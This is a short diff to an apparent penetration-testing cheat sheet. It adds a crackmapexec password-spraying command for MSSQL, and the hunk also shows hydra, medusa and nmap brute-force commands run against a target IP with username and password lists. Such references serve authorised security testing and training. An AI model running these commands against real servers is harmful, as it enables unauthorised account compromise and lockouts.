@@ -298,6 +298,7 @@ hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for
 
 ```bash
 #Use the NetBIOS name of the machine as domain
+crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
 medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
 nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be carefull with the number of password in the list, this could block accounts
